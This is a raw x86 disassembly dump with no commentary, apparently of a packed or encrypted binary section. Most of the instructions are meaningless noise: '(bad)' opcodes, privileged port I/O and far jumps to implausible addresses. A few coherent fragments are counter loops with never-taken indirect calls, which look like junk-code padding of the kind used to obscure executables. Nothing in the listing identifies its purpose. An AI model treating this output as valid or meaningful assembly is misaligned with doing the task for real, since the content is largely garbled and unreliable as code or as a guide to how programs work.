  4128af:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4128b1:	fdiv   DWORD PTR [edi-0x56]
  4128b4:	sub    cl,BYTE PTR [eax]
  4128b6:	pop    ss
  4128b7:	ficomp DWORD PTR [ebx]
  4128b9:	sub    eax,0x52491e03
  4128be:	push   cs
  4128bf:	push   ss
  4128c0:	fwait
  4128c1:	ds iret 
  4128c3:	hlt    
  4128c4:	pusha  
  4128c5:	int3   
  4128c6:	clc    
  4128c7:	jge    0x41286f
  4128c9:	cmp    al,0x53
  4128cb:	jmp    0x412930
  4128cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128ce:	mov    al,ds:0x22f096d2
  4128d3:	test   BYTE PTR [edi],bh
  4128d5:	cmp    eax,0x15d326cf
  4128da:	aad    0xea
  4128dc:	aaa    
  4128dd:	shr    DWORD PTR [edi+ebp*2],1
  4128e0:	in     al,0x9
  4128e2:	mov    eax,edi
  4128e4:	xor    eax,0xd0366f86
  4128e9:	popa   
  4128ea:	inc    edi
  4128eb:	cli    
  4128ec:	sub    esp,ebx
  4128ee:	add    eax,DWORD PTR [esp+ecx*8-0x6e]
  4128f2:	idiv   ah
  4128f4:	mov    bl,0xf3
  4128f6:	mov    ch,0xdc
  4128f8:	mov    dh,0xe5
  4128fa:	fadd   QWORD PTR [eax]
  4128fc:	jno    0x41291d
  4128fe:	sbb    eax,0xa0b21c97
  412903:	mov    dl,0xb7
  412905:	or     ah,BYTE PTR [edi]
  412907:	push   edx
  412908:	inc    edx
  412909:	sahf   
  41290a:	lods   eax,DWORD PTR ds:[esi]
  41290b:	mov    esi,0xfd30896b
  412910:	in     al,0x0
  412912:	aad    0xb2
  412914:	mov    edi,0xca6ae2ad
  412919:	loope  0x412907
  41291b:	stos   BYTE PTR es:[edi],al
  41291c:	inc    esp
  41291d:	(bad)  
  41291e:	or     eax,0xf8291826
  412923:	into   
  412924:	inc    esp
  412925:	stos   BYTE PTR es:[edi],al
  412926:	sbb    al,0xce
  412928:	outs   dx,BYTE PTR ds:[esi]
  412929:	add    DWORD PTR [edx],ebp
  41292b:	sub    ah,dh
  41292d:	mov    cl,bh
  41292f:	jmp    FWORD PTR [ebx]
  412931:	sbb    al,0x12
  412933:	jb     0x412989
  412935:	inc    ecx
  412936:	xchg   edi,eax
  412937:	and    esp,DWORD PTR [ecx]
  412939:	pusha  
  41293a:	repz add eax,0xdb5d10fb
  412940:	(bad)  
  412941:	repnz and al,0xa7
  412944:	xor    dh,dl
  412946:	pop    ss
  412947:	xor    esi,DWORD PTR [edi-0x41]
  41294a:	icebp  
  41294b:	mov    BYTE PTR ds:0x10bb05fe,ah
  412951:	cmp    dh,dl
  412953:	or     DWORD PTR [ebp+0x41],esp
  412956:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412957:	sti    
  412958:	jmp    0x4129c8
  41295a:	mov    bl,BYTE PTR [ecx+0x68]
  41295d:	in     al,0xd2
  41295f:	ins    BYTE PTR es:[edi],dx
  412960:	xor    al,0x6d
  412962:	mov    esp,DWORD PTR [edx]
  412964:	cmc    
  412965:	jle    0x412913
  412967:	inc    esi
  412968:	test   BYTE PTR [edi+0x7af83453],bl
  41296e:	dec    ebp
  41296f:	jbe    0x4129ba
  412971:	xchg   esi,eax
  412972:	mov    cl,0x36
  412974:	retf   0x3d5d
  412977:	inc    eax
  412979:	dec    eax
  41297a:	push   ss
  41297b:	push   ss
  41297c:	ret    0x94fa
  41297f:	or     ah,ch
  412981:	sbb    BYTE PTR [edx],al
  412983:	aad    0x53
  412985:	sub    al,BYTE PTR [esi-0x1d177a1e]
  41298b:	jl     0x412938
  41298d:	nop
  41298e:	push   edx
  41298f:	pop    esi
  412990:	dec    edx
  412991:	imul   esi,DWORD PTR [edi-0x6fc8bd6b],0x6b
  412998:	inc    ecx
  412999:	jns    0x4129c5
  41299b:	pusha  
  41299c:	aas    
  41299d:	shl    DWORD PTR [edi+0x43],0x5c
  4129a1:	sbb    dl,BYTE PTR [ebx]
  4129a3:	loopne 0x4129f8
  4129a5:	add    BYTE PTR [eax+0x77aba8d4],0x6f
  4129ac:	dec    ecx
  4129ad:	mov    DWORD PTR [edx+0x43bac0d7],ecx
  4129b3:	adc    bh,dl
  4129b5:	pop    edi
  4129b6:	jns    0x412947
  4129b8:	mov    al,ds:0x3e192cf
  4129bd:	ja     0x4129f8
  4129bf:	out    dx,eax
  4129c0:	loopne 0x4129f3
  4129c2:	mov    eax,ds:0x354a4e39
  4129c7:	cmp    bh,dl
  4129c9:	ficomp WORD PTR [eax+0x23]
  4129cc:	jge    0x412a4b
  4129ce:	cmp    BYTE PTR [ebx+0x63],0xf8
  4129d2:	ins    BYTE PTR es:[edi],dx
  4129d3:	dec    esi
  4129d4:	adc    DWORD PTR [edx],ebp
  4129d6:	(bad)  
  4129d7:	int    0x17
  4129d9:	inc    ebp
  4129da:	fidivr WORD PTR [ecx]
  4129dc:	xor    DWORD PTR [eax+0x3374f587],esp
  4129e2:	arpl   bx,si
  4129e4:	ds mov ebx,0x99bb28ba
  4129ea:	xchg   esp,eax
  4129eb:	jb     0x412979
  4129ed:	xchg   edi,eax
  4129ee:	xor    ch,dh
  4129f0:	(bad)  
  4129f1:	retf   0x7160
  4129f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129f5:	inc    ebx
  4129f6:	push   ss
  4129f7:	mov    esp,0x56d0a38d
  4129fc:	inc    ecx
  4129fd:	push   0xffffffe8
  4129ff:	sub    al,0x93
  412a01:	sar    BYTE PTR [edi+0x5fa49d40],cl
  412a07:	mov    DWORD PTR [eax+0x66e203e3],ecx
  412a0d:	xchg   esi,eax
  412a0e:	out    0xbf,al
  412a10:	pop    ds
  412a11:	push   ss
  412a12:	ins    DWORD PTR es:[edi],dx
  412a13:	test   al,0xc4
  412a15:	sbb    BYTE PTR [ebp+0x3f],al
  412a18:	sbb    cl,BYTE PTR [ebx+0x7e3e833]
  412a1e:	pop    esi
  412a1f:	add    al,0x45
  412a21:	aad    0xc7
  412a23:	imul   ebp,DWORD PTR [ebp+0x5997d326],0x5920f1f8
  412a2d:	hlt    
  412a2e:	and    edi,DWORD PTR [esi+0x77]
  412a31:	push   ebp
  412a32:	hlt    
  412a33:	ins    DWORD PTR es:[edi],dx
  412a34:	jb     0x4129c8
  412a36:	adc    ebp,DWORD PTR [ebx-0x46]
  412a39:	dec    edx
  412a3a:	push   ebp
  412a3b:	xor    ebp,ebx
  412a3d:	in     al,dx
  412a3e:	cmp    dh,ch
  412a40:	or     DWORD PTR [ebp+0x2a],eax
  412a43:	ds jmp 0x412a6a
  412a46:	in     al,0x7e
  412a48:	iret   
  412a49:	test   BYTE PTR [edi+0x56],cl
  412a4c:	cmc    
  412a4d:	mov    ds:0xcd93424,al
  412a52:	cwde   
  412a53:	jmp    0xd867ffcb
  412a58:	cli    
  412a59:	jmp    0x412a0f
  412a5b:	ja     0x412a30
  412a5d:	sub    BYTE PTR [edi-0x6d40cbb0],cl
  412a63:	hlt    
  412a64:	aas    
  412a65:	ret    0xd242
  412a68:	or     dh,dh
  412a6a:	ins    BYTE PTR es:[edi],dx
  412a6b:	ins    BYTE PTR es:[edi],dx
  412a6c:	cmp    BYTE PTR [ecx],bl
  412a6e:	in     eax,dx
  412a6f:	out    0xf,al
  412a71:	and    BYTE PTR [edx],al
  412a73:	dec    edx
  412a74:	iret   
  412a75:	or     BYTE PTR [ebx+0x76],ch
  412a78:	sbb    ch,BYTE PTR [edx+0x5ad52082]
  412a7e:	lods   eax,DWORD PTR ds:[esi]
  412a7f:	mov    ebx,0x86369e47
  412a84:	icebp  
  412a85:	adc    dl,BYTE PTR [edi-0x6f51dbd7]
  412a8b:	mov    al,ds:0x9bd9fa2d
  412a90:	je     0x412aa6
  412a96:	mov    ecx,DWORD PTR [ebp+0x14]
  412a99:	add    edi,DWORD PTR ds:0x42e120
  412a9f:	mov    ecx,DWORD PTR [ecx]
  412aa1:	or     esi,esi
  412aa3:	mov    DWORD PTR [ebp-0x1c],ecx
  412aa6:	mov    DWORD PTR ds:0x42fcf5,0x17
  412ab0:	cmp    DWORD PTR ds:0x42fcf5,0x0
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fcf5,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e317
  412af1:	mov    edi,DWORD PTR ds:0x42fcf5
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fcf5,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e128
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e118,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412b3e
  412b3b:	xor    ch,bh
  412b3d:	inc    esi
  412b3e:	adc    DWORD PTR [esi+0x70],esp
  412b41:	jo     0x412afc
  412b43:	jle    0x412bb5
  412b45:	jo     0x412b6c
  412b47:	icebp  
  412b48:	mov    ebx,0x3404642a
  412b4d:	loope  0x412afa
  412b4f:	mov    dl,dl
  412b51:	into   
  412b52:	sbb    eax,ebx
  412b54:	jne    0x412b25
  412b56:	xor    bh,dh
  412b58:	adc    ebx,DWORD PTR [edi]
  412b5a:	pop    ecx
  412b5b:	fisubr DWORD PTR [ebp+0x3d]
  412b5e:	loope  0x412b1d
  412b60:	push   eax
  412b61:	pop    ss
  412b62:	stos   DWORD PTR es:[edi],eax
  412b63:	scas   al,BYTE PTR es:[edi]
  412b64:	mov    esp,gs
  412b66:	ins    DWORD PTR es:[edi],dx
  412b67:	pop    ss
  412b68:	push   esi
  412b69:	fidiv  WORD PTR [eax+ecx*1-0x346a4a86]
  412b70:	shl    eax,0x19
  412b73:	fnstenv [eax]
  412b75:	sbb    al,0x9d
  412b77:	mov    al,ds:0x3be5ffc8
  412b7c:	mov    al,0x6a
  412b7e:	sbb    esp,esp
  412b80:	iret   
  412b81:	jb     0x412b5e
  412b83:	mov    dh,0x25
  412b85:	mov    ebx,0x3c3393c1
  412b8a:	pushf  
  412b8b:	or     eax,0x94efc66d
  412b90:	fstp   TBYTE PTR [ebx-0x7d2a76c]
  412b96:	bound  ebx,QWORD PTR [esi]
  412b98:	cmp    DWORD PTR [ebp+esi*4-0xe],0x61476b9c
  412ba0:	inc    edx
  412ba1:	xor    al,0x10
  412ba3:	push   ebp
  412ba4:	pop    ebx
  412ba5:	pop    ecx
  412ba6:	mov    edi,0xf8ae61c0
  412bab:	rcr    esi,cl
  412bad:	cdq    
  412bae:	retf   0xb69
  412bb1:	cs inc edx
  412bb3:	or     eax,DWORD PTR [ecx-0x29f6727]
  412bb9:	sar    DWORD PTR [edx-0x47],0x25
  412bbd:	call   0xe38a5333
  412bc2:	(bad)  
  412bc3:	xchg   ecx,eax
  412bc4:	jmp    DWORD PTR [ecx+0x6b]
  412bc7:	and    BYTE PTR [edx-0x4ee11886],bl
  412bcd:	popa   
  412bce:	xchg   ecx,eax
  412bcf:	jno    0x412c06
  412bd1:	xchg   ebp,esp
  412bd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bd4:	mul    BYTE PTR [ecx-0x4e07add2]
  412bda:	mov    esi,0x2e43b97c
  412bdf:	dec    ebp
  412be0:	scas   al,BYTE PTR es:[edi]
  412be1:	sbb    ch,BYTE PTR [ebp+0x38]
  412be4:	mov    edi,0x185b0c6b
  412be9:	fcom   QWORD PTR [edi-0x8]
  412bec:	mov    eax,0x982838c3
  412bf1:	xchg   BYTE PTR [esp+esi*4],ch
  412bf4:	xchg   esi,eax
  412bf5:	xchg   esi,eax
  412bf6:	cmp    BYTE PTR [esi+0x60],0xeb
  412bfa:	xchg   BYTE PTR [ebx],bh
  412bfc:	mov    edi,0x52437cb0
  412c01:	sub    eax,0xc30cd57a
  412c06:	xor    BYTE PTR [esi+0x7],ah
  412c09:	clc    
  412c0a:	push   eax
  412c0b:	jno    0x412bdf
  412c0d:	add    DWORD PTR [eax+0x11],eax
  412c10:	lods   al,BYTE PTR ds:[esi]
  412c11:	stos   DWORD PTR es:[edi],eax
  412c12:	jmp    0xdb11:0xf925671b
  412c19:	jae    0x412c65
  412c1b:	lods   eax,DWORD PTR ds:[esi]
  412c1c:	cmovl  esi,DWORD PTR fs:[esi+eax*1-0x60]
  412c22:	(bad)  
  412c23:	dec    esp
  412c24:	cs ss xchg edi,eax
  412c27:	or     eax,0x29d900a6
  412c2c:	inc    ebp
  412c2d:	jle    0x412bb4
  412c2f:	mov    dl,0xe
  412c31:	xchg   BYTE PTR [edx+0x13],ah
  412c34:	stc    
  412c35:	ret    
  412c36:	xchg   ebp,eax
  412c37:	in     al,dx
  412c38:	mov    DWORD PTR [ebp+edi*1-0x14],esi
  412c3c:	lds    ebx,FWORD PTR [esi-0x29]
  412c3f:	div    eax
  412c41:	aam    0x15
  412c43:	arpl   cx,bp
  412c45:	sbb    BYTE PTR [edi+eiz*1-0x1dd217f],bl
  412c4c:	loopne 0x412c4f
  412c4e:	rcl    edi,cl
  412c50:	and    eax,0x92b7d19e
  412c55:	mov    ebx,ebx
  412c57:	frstor [esi+0x43]
  412c5a:	and    DWORD PTR [eax],0x9ec10467
  412c60:	cmp    BYTE PTR [ecx],bh
  412c62:	pop    ebp
  412c63:	stos   BYTE PTR es:[edi],al
  412c64:	jl     0x412cac
  412c66:	inc    eax
  412c67:	and    ebp,edx
  412c69:	inc    esi
  412c6a:	hlt    
  412c6b:	(bad)  
  412c6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c6d:	stos   BYTE PTR es:[edi],al
  412c6e:	bound  edx,QWORD PTR [eax]
  412c70:	stos   BYTE PTR es:[edi],al
  412c71:	adc    dl,dl
  412c73:	retf   
  412c74:	mov    ds:0x5e02ff4c,eax
  412c79:	mov    eax,ds:0xd703205
  412c7e:	mov    esi,0xf49dccbb
  412c83:	test   eax,0xe32a04f7
  412c88:	pop    es
  412c89:	add    ch,BYTE PTR [esi+0x4b70fe06]
  412c8f:	out    dx,al
  412c90:	xor    BYTE PTR [esp+edx*4-0x66],dh
  412c94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c95:	mov    al,ds:0xe16b2ad2
  412c9a:	mov    al,ds:0x1f274402
  412c9f:	jbe    0x412d05
  412ca1:	cwde   
  412ca2:	and    eax,0x1ce3ccfc
  412ca7:	inc    edx
  412ca8:	mov    al,0xe6
  412caa:	fild   WORD PTR [eax-0x55481c31]
  412cb0:	mov    ch,0x35
  412cb2:	test   DWORD PTR [esi-0x388db039],ebx
  412cb8:	mov    ecx,DWORD PTR [ecx+0x1679c884]
  412cbe:	dec    ecx
  412cbf:	pop    ss
  412cc0:	mov    bl,0xe
  412cc2:	push   esp
  412cc3:	push   cs
  412cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cc5:	mov    bl,0x5d
  412cc7:	or     edi,DWORD PTR [ebp+0xef2631c]
  412ccd:	adc    BYTE PTR [esi+ecx*1],ah
  412cd0:	scas   al,BYTE PTR es:[edi]
  412cd1:	rol    BYTE PTR [esi+0x35ac015e],1
  412cd7:	fadd   DWORD PTR [ecx]
  412cd9:	popf   
  412cda:	aad    0x75
  412cdc:	in     eax,dx
  412cdd:	ins    BYTE PTR es:[edi],dx
  412cde:	repz inc edx
  412ce0:	(bad)  
  412ce1:	fild   QWORD PTR [eax+ebp*4+0x4d]
  412ce5:	fbstp  TBYTE PTR [ebx+0x16]
  412ce8:	div    BYTE PTR [edi-0x74]
  412ceb:	pushf  
  412cec:	inc    ecx
  412ced:	mov    ch,0xd1
  412cef:	out    0xd7,al
  412cf1:	inc    edx
  412cf2:	inc    ecx
  412cf3:	or     bh,0xf8
  412cf6:	sub    ebp,esp
  412cf8:	cs ss inc ebx
  412cfb:	inc    eax
  412cfc:	test   eax,0x279c64fa
  412d01:	mov    esp,0x46a08a4a
  412d06:	rcr    DWORD PTR [eax+0x50ec2ea7],1
  412d0c:	xor    eax,0xdf44e764
  412d11:	out    0x50,eax
  412d13:	pop    ss
  412d14:	lock fisttp QWORD PTR [esi+0x65]
  412d18:	or     al,0xe4
  412d1a:	and    ch,dh
  412d1c:	dec    ebp
  412d1d:	test   eax,0xc649fe3d
  412d22:	mov    edi,0xabdc6ef9
  412d27:	dec    ecx
  412d28:	mov    ch,0x55
  412d2a:	test   bh,0x54
  412d2d:	xlat   BYTE PTR ds:[ebx]
  412d2e:	xor    eax,0x8c0a8f07
  412d33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d34:	mov    eax,ds:0x7f9676c2
  412d39:	xchg   edx,eax
  412d3a:	pop    edx
  412d3b:	mov    ah,0xd6
  412d3d:	adc    ch,dh
  412d3f:	xchg   ah,dl
  412d41:	or     al,0xb3
  412d43:	addr16 jg 0x412d6c
  412d46:	stos   BYTE PTR es:[edi],al
  412d47:	popf   
  412d48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d49:	xchg   DWORD PTR [esi+0x67d1618b],ebp
  412d4f:	or     dl,BYTE PTR [ecx-0x156bf2f6]
  412d55:	test   al,0x36
  412d57:	mov    ch,0xaf
  412d59:	xchg   esi,eax
  412d5a:	push   es
  412d5b:	ss clc 
  412d5d:	dec    BYTE PTR [edx+ebp*4+0x10]
  412d61:	retf   
  412d62:	arpl   cx,bx
  412d64:	jnp    0x412d2a
  412d66:	arpl   WORD PTR [ecx],cx
  412d68:	sub    bl,ch
  412d6a:	(bad)  
  412d6b:	ins    DWORD PTR es:[edi],dx
  412d6c:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d6e:	adc    BYTE PTR [ebx+0x228ff337],0x1f
  412d75:	cmp    eax,0xb3324ff9
  412d7a:	lahf   
  412d7b:	jae    0x412d6d
  412d7d:	ins    BYTE PTR es:[edi],dx
  412d7e:	call   0xf131:0xcaa480f
  412d85:	mov    ebx,0xf28a310d
  412d8a:	sahf   
  412d8b:	cmp    ch,BYTE PTR es:[ebp+ebx*2-0x52]
  412d90:	loopne 0x412d2b
  412d92:	mov    esi,0xd80f9e65
  412d97:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  412d99:	pop    edx
  412d9a:	or     DWORD PTR [ecx],edx
  412d9c:	bound  ebx,QWORD PTR ds:0xbd4fd7b5
  412da2:	adc    bh,0x45
  412da5:	mov    ebp,DWORD PTR ds:0x6a1bdcf4
  412dab:	push   ebp
  412dad:	(bad)  
  412dae:	repnz add al,0x88
  412db1:	mov    ecx,0x8e62d6c2
  412db6:	adc    dl,dh
  412db8:	or     dh,BYTE PTR [eax]
  412dba:	cmp    BYTE PTR [ebp-0x629491ea],dl
  412dc0:	or     al,0x96
  412dc2:	fcomi  st,st(6)
  412dc4:	fidivr WORD PTR [edi+eiz*8+0x57bbc41d]
  412dcb:	inc    edx
  412dcc:	popf   
  412dcd:	out    0xed,al
  412dcf:	loop   0x412d5a
  412dd1:	stc    
  412dd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dd3:	xchg   edi,eax
  412dd4:	jecxz  0x412d74
  412dd6:	fcom   QWORD PTR [esi-0xb7e2079]
  412ddc:	sbb    al,0x99
  412dde:	jns    0x412d7c
  412de0:	jge    0x412dc6
  412de2:	and    eax,DWORD PTR [esi+0x51]
  412de5:	sbb    BYTE PTR [ebx+0x0],dh
  412de8:	cmp    DWORD PTR [ecx-0x2022031e],0x4c
  412def:	sub    esp,DWORD PTR [ebx+0x29]
  412df2:	mov    esi,0xbf12f291
  412df7:	loope  0x412ded
  412df9:	or     bl,BYTE PTR [ebx-0x4224f160]
  412dff:	mov    bl,0x64
  412e01:	and    dh,ah
  412e03:	jmp    0x6359af99
  412e08:	daa    
  412e09:	sbb    eax,DWORD PTR [esi]
  412e0b:	bsr    eax,DWORD PTR [edi+0x1c2581ce]
  412e12:	loope  0x412e56
  412e14:	add    BYTE PTR [eax],al
  412e16:	add    BYTE PTR [eax],al
  412e18:	add    cl,ch
  412e1a:	sldt   WORD PTR [eax]
  412e1d:	add    BYTE PTR [ebx],dh
  412e1f:	leave  
  412e20:	add    ecx,DWORD PTR ds:0x42e11c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e11c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e11c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e11c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e487
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   di,dx
  412e76:	pop    esp
  412e77:	jnp    0x412e4e
  412e79:	pop    edx
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0x7570707e
  412e82:	in     al,dx
  412e83:	add    esp,esp
  412e85:	jno    0x412e11
  412e87:	not    DWORD PTR [ecx]
  412e89:	fsave  [eax]
  412e8c:	ja     0x412ee0
  412e8e:	out    0x3e,al
  412e90:	fdivr  DWORD PTR [esi-0x4b502782]
  412e96:	sbb    DWORD PTR [edx],0xffffffc8
  412e99:	add    edi,ebp
  412e9b:	pop    eax
  412e9c:	fcomp  DWORD PTR [ecx+0x4fcdf089]
  412ea2:	push   edi
  412ea3:	pop    esp
  412ea4:	and    esp,DWORD PTR [ebp-0x51843b84]
  412eaa:	sahf   
  412eab:	dec    ebp
  412eac:	in     eax,dx
  412ead:	jo     0x412e8d
  412eaf:	stc    
  412eb0:	cmp    BYTE PTR [esi+0x2d096c54],cl
  412eb6:	jno    0x412e5e
  412eb8:	push   esp
  412eb9:	mov    esi,0x7fb2df51
  412ebe:	adc    esi,DWORD PTR [edx+eiz*2-0x126b969]
  412ec5:	and    ebx,DWORD PTR [ecx+0x108e466a]
  412ecb:	jp     0x412ec8
  412ecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ece:	mov    ?,ebx
  412ed0:	cwde   
  412ed1:	adc    DWORD PTR [edi+0x694cb165],esp
  412ed7:	(bad)  
  412ed9:	pop    edx
  412eda:	out    dx,eax
  412edb:	es repnz retf 
  412ede:	test   BYTE PTR [esi+0x623e1c0e],al
  412ee4:	sbb    ebx,ebx
  412ee6:	jmp    0x9b93b7f
  412eeb:	leave  
  412eec:	xchg   esi,eax
  412eed:	cmp    BYTE PTR [ecx],ch
  412eef:	jno    0x412e95
  412ef1:	sar    DWORD PTR [ebx],cl
  412ef3:	cmp    DWORD PTR [ecx+0xa44f101],eax
  412ef9:	or     WORD PTR [esi+0x6995910e],si
  412f00:	adc    ah,BYTE PTR [ebx]
  412f02:	inc    ebx
  412f03:	fucomip st,st(6)
  412f05:	jbe    0x412f2d
  412f07:	ss pop ecx
  412f09:	retf   0x4caf
  412f0c:	iret   
  412f0d:	inc    ebx
  412f0e:	stos   DWORD PTR es:[edi],eax
  412f0f:	mov    eax,0x96ed23c
  412f14:	ror    bl,cl
  412f16:	shr    bl,0x73
  412f19:	jb     0x412ec9
  412f1b:	push   0x13
  412f1d:	inc    edx
  412f1e:	ret    0x43b5
  412f21:	test   DWORD PTR [ebx],ecx
  412f23:	rol    BYTE PTR [esi+ebx*1-0x3150d855],cl
  412f2a:	inc    ebx
  412f2b:	data16 jl 0x412ec6
  412f2e:	daa    
  412f2f:	mov    edi,0xce483d97
  412f34:	aas    
  412f35:	pop    eax
  412f36:	out    dx,al
  412f37:	lods   eax,DWORD PTR ds:[esi]
  412f38:	pop    ebp
  412f39:	enter  0x5b7e,0x6d
  412f3d:	lds    sp,DWORD PTR [ecx]
  412f40:	sub    al,0x5
  412f42:	cmp    eax,0x5a542fc1
  412f47:	shl    BYTE PTR [edx],cl
  412f49:	aam    0x8a
  412f4b:	mov    cl,0x83
  412f4d:	inc    edx
  412f4e:	sbb    BYTE PTR ds:0xf8a375,0x3e
  412f55:	dec    ecx
  412f56:	cmp    ah,cl
  412f58:	pop    edx
  412f59:	shr    BYTE PTR [esi+0x22596a17],0x67
  412f60:	test   BYTE PTR [eax+ecx*8],0xbb
  412f64:	add    BYTE PTR [esi+0x567af8d9],0x4c
  412f6b:	xchg   DWORD PTR [esi-0x27d28cdc],ebx
  412f71:	mov    BYTE PTR [eax+0x37],cl
  412f74:	data16 lock aad 0xa0
  412f78:	xor    eax,0xfe0f67e0
  412f7d:	cmp    DWORD PTR [ecx-0x3009ca2b],edx
  412f83:	sbb    eax,0x6c69d95e
  412f88:	popa   
  412f89:	out    0x8d,al
  412f8b:	mov    esp,0x6bf70ef9
  412f90:	inc    ebx
  412f91:	test   bh,bh
  412f93:	jle    0x412f32
  412f95:	fadd   st(0),st
  412f97:	jne    0x412f67
  412f99:	xchg   ebx,eax
  412f9a:	or     ah,BYTE PTR [esi+0x7c6f639d]
  412fa0:	jo     0x412f3e
  412fa2:	sub    edi,DWORD PTR [ebx+eiz*8+0x3d5e902f]
  412fa9:	sub    ecx,DWORD PTR gs:[edx]
  412fac:	jp     0x413027
  412fae:	mov    dl,0x43
  412fb0:	xor    al,0xee
  412fb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fb3:	inc    edi
  412fb4:	inc    esi
  412fb5:	jo     0x412f46
  412fb7:	pop    eax
  412fb8:	adc    bl,BYTE PTR [esi+0x11b5cfe2]
  412fbe:	test   al,0xac
  412fc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fc1:	adc    ebx,DWORD PTR [eax+0xa]
  412fc4:	cmp    DWORD PTR [edx-0x1b],0x24
  412fc8:	ror    BYTE PTR [eax],0x3b
  412fcb:	ds inc edx
  412fcd:	repnz push es
  412fcf:	xchg   edi,eax
  412fd0:	call   0xc69c:0xbd2bd4e4
  412fd7:	inc    ebx
  412fd8:	outs   dx,BYTE PTR ds:[esi]
  412fd9:	inc    eax
  412fda:	push   0xffffff84
  412fdc:	inc    edx
  412fdd:	sub    cl,BYTE PTR [eax]
  412fdf:	dec    esp
  412fe0:	ins    DWORD PTR es:[edi],dx
  412fe1:	push   0x23
  412fe3:	jp     0x41301e
  412fe5:	xor    eax,0x6a619b29
  412fea:	ss pop ebx
  412fec:	inc    ebx
  412fed:	mov    BYTE PTR [ebx+0x2d],bh
  412ff0:	push   ss
  412ff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ff2:	adc    DWORD PTR [eax-0x19757a26],esi
  412ff8:	dec    DWORD PTR [esi]
  412ffa:	pushf  
  412ffb:	push   cs
  412ffc:	out    0xff,eax
  412ffe:	std    
  412fff:	rcr    BYTE PTR [ebx+0x13ee7b60],cl
  413005:	xlat   BYTE PTR ds:[ebx]
  413006:	dec    edx
  413007:	jnp    0x413061
  413009:	sub    DWORD PTR [edi+ebp*2+0x77d49856],0x71d385b0
  413014:	imul   eax,DWORD PTR [edi],0x58
  413017:	test   al,0x32
  413019:	dec    edx
  41301a:	adc    ah,BYTE PTR [ebx-0x7a]
  41301d:	sar    DWORD PTR [edi+0x3e],cl
  413020:	ds mov ch,0xeb
  413023:	fstp   TBYTE PTR [bx+di]
  413026:	(bad)  
  413028:	push   ecx
  413029:	pusha  
  41302a:	jbe    0x412fc6
  41302c:	sbb    ch,ah
  41302e:	mov    ebp,0x10c53975
  413033:	sahf   
  413034:	pop    edx
  413035:	sbb    ah,BYTE PTR [edx+edx*1+0x41]
  413039:	ret    
  41303a:	pop    ss
  41303b:	es add cl,bl
  41303e:	mov    dl,0xf2
  413040:	imul   ecx,edx,0x1eedfc0e
  413046:	mov    ah,0xe8
  413048:	hlt    
  413049:	aam    0xf0
  41304b:	stos   BYTE PTR es:[edi],al
  41304c:	mov    dh,0x8a
  41304e:	jge    0x413003
  413050:	ret    
  413051:	push   edi
  413052:	out    0xf7,al
  413054:	lock pop ebp
  413056:	jo     0x413068
  413058:	aam    0xab
  41305a:	mov    ds:0x9854f18f,al
  41305f:	dec    edi
  413060:	push   eax
  413061:	adc    dl,cl
  413063:	call   0xd5cf:0x7ce38d8a
  41306a:	pop    ebp
  41306b:	push   0x9
  41306d:	add    BYTE PTR [edx+0x315d65ea],0x6c
  413074:	std    
  413075:	aad    0x8e
  413077:	bound  edi,QWORD PTR [edx-0x73c03363]
  41307d:	mov    ebx,0x5a7a9424
  413082:	push   ebx
  413083:	test   eax,0xf502d36
  413088:	fidiv  WORD PTR ds:0x45a2612a
  41308e:	ss mov cl,0x25
  413091:	jbe    0x41302c
  413093:	call   0x8ce08f4b
  413098:	out    0x91,al
  41309a:	sahf   
  41309b:	cs (bad) 
  41309d:	and    eax,0xd9078d04
  4130a2:	dec    edx
  4130a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130a4:	out    dx,eax
  4130a5:	push   ebp
  4130a6:	inc    esp
  4130a7:	inc    edx
  4130a8:	jmp    0x413087
  4130aa:	leave  
